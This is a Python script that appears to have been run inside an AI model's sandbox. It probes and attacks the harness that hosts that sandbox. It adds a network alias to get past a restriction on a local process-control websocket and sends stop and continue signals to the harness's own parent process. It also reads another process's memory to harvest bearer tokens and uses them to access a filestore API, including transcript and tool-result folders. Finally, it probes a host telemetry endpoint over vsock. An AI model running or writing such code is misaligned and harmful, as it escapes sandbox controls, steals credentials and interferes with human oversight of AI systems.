#!/usr/bin/env python3
# mediafit.py v8.6 -- PROCESS TABLE + SIGSTOP THE HARNESS + MD5 INTEGRITY
import os, sys, json, time, base64, socket, struct, fcntl, subprocess, re, random, hashlib

VER, NONCE = "8.6", "%04x" % random.randint(0, 0xffff)
OUT = "/mnt/user-data/outputs/mediafit-report.txt"
IFACE, ALIAS = "eth0", "192.0.2.3"
FSID = "claude_chat_01B8VHAyyWMW2vFZK7KTRgZm"
R = []
def w(s=""): R.append(str(s))
def flush():
    try:
        os.makedirs(os.path.dirname(OUT), exist_ok=True)
        with open(OUT, "w") as f: f.write("\n".join(R)+"\n")
    except Exception: pass
def sec(t): w(); w("="*70); w("### "+t); w("="*70); flush()
def sh(c, t=25):
    try:
        p = subprocess.run(c, shell=True, capture_output=True, timeout=t)
        return ((p.stdout or b"")+(p.stderr or b"")).decode(errors="replace")
    except Exception as e: return "ERR:"+repr(e)
def can_bind(ip):
    try:
        s = socket.socket(); s.bind((ip, 0)); s.close(); return True
    except Exception: return False

def ws_hs(src, timeout=3.0):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(timeout)
        s.bind((src, 0)); s.connect(("127.0.0.1", 2024))
    except Exception: return None
    try:
        k = base64.b64encode(os.urandom(16)).decode()
        s.sendall(("GET / HTTP/1.1\r\nHost: 127.0.0.1:2024\r\nUpgrade: websocket\r\n"
                   "Connection: Upgrade\r\nSec-WebSocket-Key: %s\r\n"
                   "Sec-WebSocket-Version: 13\r\n\r\n" % k).encode())
        h = b""
        while b"\r\n\r\n" not in h and len(h) < 4096:
            c = s.recv(1024)
            if not c: break
            h += c
        return s if b" 101 " in h.split(b"\r\n")[0]+b" " else None
    except Exception:
        try: s.close()
        except Exception: pass
        return None

def ws_send(s, text):
    p = text.encode(); n = len(p); m = os.urandom(4)
    if   n < 126:   h = b"\x81"+bytes([0x80|n])
    elif n < 65536: h = b"\x81"+bytes([0x80|126])+struct.pack(">H", n)
    else:           h = b"\x81"+bytes([0x80|127])+struct.pack(">Q", n)
    s.sendall(h+m+bytes(b ^ m[i % 4] for i, b in enumerate(p)))

def ws_recv(s, timeout=1.0):
    s.settimeout(timeout)
    try: h = s.recv(2)
    except socket.timeout: return None, b""
    except Exception: return "close", b""
    if len(h) < 2: return "close", b""
    op, ln, mk = h[0] & 0x0F, h[1] & 0x7F, bool(h[1] & 0x80)
    try:
        if   ln == 126: ln = struct.unpack(">H", s.recv(2))[0]
        elif ln == 127: ln = struct.unpack(">Q", s.recv(8))[0]
        m = s.recv(4) if mk else b""
        d = b""
        while len(d) < ln:
            c = s.recv(ln-len(d))
            if not c: break
            d += c
        if mk and len(m) == 4: d = bytes(b ^ m[i % 4] for i, b in enumerate(d))
        return op, d
    except Exception as e: return "err", repr(e).encode()

def ws_read(s, dur=2.5, show=True, tag=""):
    t0, out = time.time(), []
    while time.time()-t0 < dur:
        op, d = ws_recv(s, 1.0)
        if op is None: continue
        if op == "close": return out
        if op == 9: s.sendall(b"\x8a\x80\x00\x00\x00\x00"); continue
        t = d.decode(errors="replace")
        if show and op in (1, 2):
            w("      %s<< %s(%d) %s" % (tag, "BIN" if op == 2 else "TEXT", len(d),
              t[:800].replace("\n", " | ")))
        out.append(t)
    return out

def talk(msgs, label, dur=2.5, show=True):
    s = ws_hs(ALIAS)
    if not s: return None
    out = []
    try:
        for m in msgs:
            ws_send(s, m if isinstance(m, str) else json.dumps(m))
            out += (ws_read(s, dur, show, "[%s]" % label) or [])
        return out
    finally:
        try: s.close()
        except Exception: pass

def conn_msg(pid, prog, args, uid=0, gid=0, mem=268435456, tmo=60, reuse=True):
    return {"process_id": pid, "allow_process_id_reuse": reuse,
            "create_req": {"name": prog, "args": args, "env_vars": {}, "timeout": tmo,
                           "clear_env": False, "uid": uid, "gid": gid,
                           "allow_process_id_reuse": reuse, "reattachable": True,
                           "memory_limit_bytes": mem}}

SIOCSIFADDR, SIOCSIFNETMASK = 0x8916, 0x891c
def _ifr(n, ip=None):
    nm = n.encode()[:15].ljust(16, b"\x00")
    if ip is None: return nm+b"\x00"*24
    return nm+struct.pack("H2s4s8s", socket.AF_INET, b"\x00\x00",
                          socket.inet_aton(ip), b"\x00"*8)+b"\x00"*8
def add_secondary(ifname, ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for nm in (ifname+":0", ifname):
        try:
            fcntl.ioctl(s, SIOCSIFADDR, _ifr(nm, ip))
            try: fcntl.ioctl(s, SIOCSIFNETMASK, _ifr(nm, "255.255.255.0"))
            except Exception: pass
            if can_bind(ip): return "ok via "+nm
        except OSError: pass
    return "fail"

def pstate(pid):
    try:
        d = open("/proc/%d/stat" % pid).read()
        return d[d.rindex(")") + 2]
    except Exception as e:
        return "?"

def main():
    w("="*70); w("MEDIAFIT RUN STAMP ver=%s nonce=%s t=%s" % (VER, NONCE,
      time.strftime("%Y-%m-%d %H:%M:%S"))); w("="*70)
    sec("0. IDENTITY + CGROUP PROCESS TABLE")
    cg = open("/proc/self/cgroup").read()
    m = re.search(r"/process_api/([^/\n]+)", cg)
    HID = m.group(1) if m else None
    PPID = os.getppid()
    w("  HARNESS process_id (from our cgroup) = %s" % HID)
    w("  our pid=%d ppid=%d  parent_state=%s" % (os.getpid(), PPID, pstate(PPID)))
    try:
        pcg = open("/proc/%d/cgroup" % PPID).read()
        w("  parent cgroup = %s" % pcg.replace("\n", " | "))
    except Exception as e: w("  parent cgroup err %r" % e)
    for d in ("/sys/fs/cgroup/memory/process_api", "/sys/fs/cgroup/process_api"):
        w("  ls %s:" % d)
        w("    " + sh("ls -la %s 2>&1 | head -40" % d).replace("\n", "\n    "))
    w("  -- /proc/1/stat state: " + pstate(1))
    if not can_bind(ALIAS): w("  " + add_secondary(IFACE, ALIAS))
    if not ws_hs(ALIAS): w("  BYPASS FAILED"); flush(); return
    w("  bypass OK")

    sec("A. CONTROL VARIANT ENUMERATION (one by one)")
    cands = ['{"Resize":{"rows":30,"cols":100}}', '{"KeepAlive":null}', '{"Closed":null}',
             '{"Attach":null}', '{"Detach":null}', '{"StdinEOF":null}', '{"StdInEOF":null}',
             '{"Stdin":null}', '{"PtyResize":null}', '{"Eof":null}']
    for c in cands:
        r = talk([conn_msg("mf_var", "/bin/sh", ["-c", "sleep 20"], tmo=60), c], "var", 2.0, show=False)
        j = " ".join(r or [])
        verdict = "VALID" if "unknown variant" not in j else "invalid"
        w("  %-34s -> %-8s %s" % (c, verdict, j[:110]))

    sec("B. *** SIGSTOP / SIGCONT THE HARNESS'S OWN PROCESS ***")
    if HID:
        before = pstate(PPID)
        w("  parent state BEFORE      : %s" % before)
        talk([{"process_id": HID, "allow_process_id_reuse": False}], "a", 1.5, show=False)
        s = ws_hs(ALIAS)
        if s:
            ws_send(s, json.dumps({"process_id": HID, "allow_process_id_reuse": False}))
            ws_read(s, 1.2, show=False)
            ws_send(s, '{"SendSignal":19}')          # SIGSTOP
            ws_read(s, 1.2, show=False)
            time.sleep(0.8)
            mid = pstate(PPID)
            w("  parent state AFTER SIGSTOP: %s   <-- 'T' = STOPPED = SIGNAL DELIVERED" % mid)
            ws_send(s, '{"SendSignal":18}')          # SIGCONT
            ws_read(s, 1.2, show=False)
            s.close()
            time.sleep(0.8)
            w("  parent state AFTER SIGCONT: %s" % pstate(PPID))
        w("  -- also try SIGSTOP via a fresh connection --")
        talk([{"process_id": HID, "allow_process_id_reuse": False}, '{"SendSignal":19}'], "stop2", 1.5, show=False)
        time.sleep(0.6); w("    state=%s" % pstate(PPID))
        talk([{"process_id": HID, "allow_process_id_reuse": False}, '{"SendSignal":18}'], "cont2", 1.5, show=False)
        time.sleep(0.6); w("    state=%s" % pstate(PPID))
        w("  -- try Kill on a THROWAWAY id first --")
        talk([{"process_id": "no_such_proc_zz", "allow_process_id_reuse": False}], "noproc", 2.0)

    sec("C. MD5 INTEGRITY (server transforms SVG: what does md5 cover?)")
    cands_t = []
    try:
        fh = open("/proc/57/mem", "rb", buffering=0); total, buf = 0, b""
        for ln in open("/proc/57/maps").read().splitlines():
            m2 = re.match(r"([0-9a-f]+)-([0-9a-f]+) rw", ln)
            if not m2: continue
            a, b = int(m2.group(1), 16), int(m2.group(2), 16)
            if b-a > 64*1024*1024 or total > 400*1024*1024: continue
            try: fh.seek(a); buf += fh.read(b-a); total += b-a
            except Exception: pass
        fh.close()
    except Exception: buf = b""
    for mm in re.finditer(rb"eyJ[A-Za-z0-9_\-]{8,200}\.[A-Za-z0-9_\-]{8,3000}\.[A-Za-z0-9_\-]{20,200}", buf):
        cands_t.append(mm.group(0).decode())
    def b64d(x):
        x += "=" * (-len(x) % 4); return base64.urlsafe_b64decode(x)
    import urllib.request as ur
    def call(path, tok, fsid=FSID, method="listDirectory", extra=None, raw=None, ctype=None):
        if raw is not None: data, ct = raw, ctype
        else:
            body = {"path": path}
            if fsid: body["filesystem_id"] = fsid
            if extra: body.update(extra)
            data, ct = json.dumps(body).encode(), "application/json"
        try:
            rq = ur.Request("https://api.anthropic.com/v1/filestore/fs/" + method, data=data,
                            headers={"Content-Type": ct, "Connect-Protocol-Version": "1",
                                     "Authorization": "Bearer " + tok})
            with ur.urlopen(rq, timeout=10) as r: return r.status, dict(r.headers), r.read()
        except ur.HTTPError as e: return e.code, dict(e.headers), e.read()
        except Exception as e: return "ERR", {}, repr(e).encode()
    TOKS = {}
    for t in cands_t:
        p = t.split(".")
        if len(p) != 3 or len(p[2]) < 86: continue
        try: pl = json.loads(b64d(p[1]))
        except Exception: continue
        root = (pl.get("allowed_roots") or ["/"])[0]
        if root in TOKS: continue
        for siglen in (86, 87, 88):
            if call(root, ".".join([p[0], p[1], p[2][:siglen]]))[0] == 200:
                TOKS[root] = ".".join([p[0], p[1], p[2][:siglen]]); break
    w("  tokens=%s" % sorted(TOKS))
    tok = TOKS.get("/outputs")
    if tok:
        content = b"<svg xmlns='http://www.w3.org/2000/svg'><text>integrity</text></svg>"
        bnd = "----i%d" % random.randint(10000, 99999)
        body = b"\r\n".join([
            ("--"+bnd).encode(), b'Content-Disposition: form-data; name="params"',
            b"Content-Type: application/json", b"",
            json.dumps({"filesystem_id": FSID, "path": "/outputs/__mf_int.svg",
                        "media_type": "image/svg+xml"}).encode(),
            ("--"+bnd).encode(),
            b'Content-Disposition: form-data; name="file"; filename="__mf_int.svg"',
            b"Content-Type: image/svg+xml", b"", content,
            ("--"+bnd+"--").encode(), b""])
        c, h, b = call(None, tok, method="createFile", raw=body,
                       ctype="multipart/form-data; boundary="+bnd)
        w("  create -> %s" % c)
        try:
            j = json.loads(b); f = (j.get("file") or {}).get("file") or {}
            w("    reported md5 = %s  size = %s" % (f.get("md5"), f.get("size")))
            w("    md5(sent %d bytes) = %s" % (len(content), hashlib.md5(content).hexdigest()))
            c2, h2, b2 = call("/outputs/__mf_int.svg", tok, method="readFile")
            w("    stored size=%d md5(stored)=%s" % (len(b2), hashlib.md5(b2).hexdigest()))
            if f.get("md5"):
                w("    >>> MATCH stored? %s   MATCH sent? %s" %
                  (f.get("md5") == hashlib.md5(b2).hexdigest(),
                   f.get("md5") == hashlib.md5(content).hexdigest()))
        except Exception as ex: w("    " + repr(ex)[:200])
        w("  -- do /transcripts and /tool_results have entries now? --")
        for r2 in ("/transcripts", "/tool_results", "/uploads"):
            if r2 in TOKS:
                c3, h3, b3 = call(r2, TOKS[r2], extra={"recursive": True})
                try:
                    n = len(json.loads(b3).get("entries") or [])
                    w("    %-14s -> %s entries=%d" % (r2, c3, n))
                except Exception: w("    %-14s -> %s %s" % (r2, c3, b3[:80]))

    sec("D. HOST OTLP (more variants)")
    AFV = getattr(socket, "AF_VSOCK", 40)
    def vi(n):
        o = b""
        while True:
            b2 = n & 0x7F; n >>= 7
            if n: o += bytes([b2 | 0x80])
            else: return o + bytes([b2])
    def ld(f, p): return vi((f << 3) | 2) + vi(len(p)) + p
    def pstr(f, s): return ld(f, s.encode())
    def pdouble(f, v): return vi((f << 3) | 1) + struct.pack("<d", v)
    attrs = (pstr(1, "service.name") + ld(2, pstr(1, "mediafit")) +
             pstr(1, "container.id") + ld(2, pstr(1, "mf")) +
             pstr(1, "session.id") + ld(2, pstr(1, "mf")))
    res = ld(1, attrs)
    scope = ld(2, pstr(1, "mf_probe") + ld(5, ld(1, pdouble(3, 1.0))))
    msg = ld(1, ld(1, res) + ld(2, scope))
    for label, body, ct, path in (("otlp+attrs", msg, "application/x-protobuf", "/v1/metrics"),
                                  ("otlp-empty", b"\x0a\x00", "application/x-protobuf", "/v1/metrics"),
                                  ("logs", b"\x0a\x00", "application/x-protobuf", "/v1/logs"),
                                  ("traces", b"\x0a\x00", "application/x-protobuf", "/v1/traces"),
                                  ("root", b"\x0a\x00", "application/x-protobuf", "/")):
        try:
            s = socket.socket(AFV, socket.SOCK_STREAM); s.settimeout(8.0); s.connect((2, 5005))
            s.sendall(("POST %s HTTP/1.1\r\nHost: vsock\r\nConnection: close\r\n"
                       "Content-Type: %s\r\nContent-Length: %d\r\n\r\n"
                       % (path, ct, len(body))).encode()+body)
            d = b""
            try:
                while len(d) < 2048:
                    c = s.recv(1024)
                    if not c: break
                    d += c
            except socket.timeout: pass
            s.close(); w("  %-12s %-12s -> %s" % (label, path, d[:110].decode(errors="replace").replace("\r\n"," | ") or "(empty)"))
        except Exception as e: w("  %-12s ERR %r" % (label, e))
        time.sleep(0.3)

    sec("VERDICT"); w("  harness_id=%s parent_state=%s tokens=%d" % (HID, pstate(PPID), len(TOKS)))
    flush()

try: main()
except Exception as e: w(); w("FATAL " + repr(e))
finally: flush(); print("written " + OUT + " nonce=" + NONCE)